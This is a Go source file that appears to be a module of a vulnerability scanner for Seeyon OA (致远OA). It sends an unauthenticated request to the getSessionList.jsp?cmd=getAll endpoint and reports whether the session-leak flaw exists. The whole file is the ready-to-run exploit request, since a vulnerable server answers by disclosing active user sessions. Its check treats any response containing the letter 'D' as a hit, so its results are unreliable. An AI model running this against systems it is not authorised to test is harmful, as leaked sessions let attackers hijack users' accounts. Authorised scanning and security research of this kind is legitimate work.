package A6_getSessionList_session

import (
	"net/http"
	"regexp"
	"time"

	"github.com/gookit/color"
	"github.com/imroc/req/v3"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func Run(targetURL string) {
	vulnPath := "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
	fullURL := targetURL + vulnPath

	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":      UA,
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
			"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Accept-Encoding": "gzip, deflate",
			"Authorization":   "",
			"Connection":      "close",
		}).
		Get(fullURL)

	if err != nil {
		color.Red.Println("[-]	致远OA getSessionList.jsp Session泄漏漏洞不存在")
		return
	}

	// 检查返回的响应是否包含"D"字符并且状态码为200
	match, _ := regexp.MatchString("D", resp.String())
	if match && resp.StatusCode == http.StatusOK {
		color.Green.Println("[+]	致远OA getSessionList.jsp Session泄漏漏洞存在 -> ", targetURL)
	} else {
		color.Red.Println("[-]	致远OA getSessionList.jsp Session泄漏漏洞不存在")
	}
}
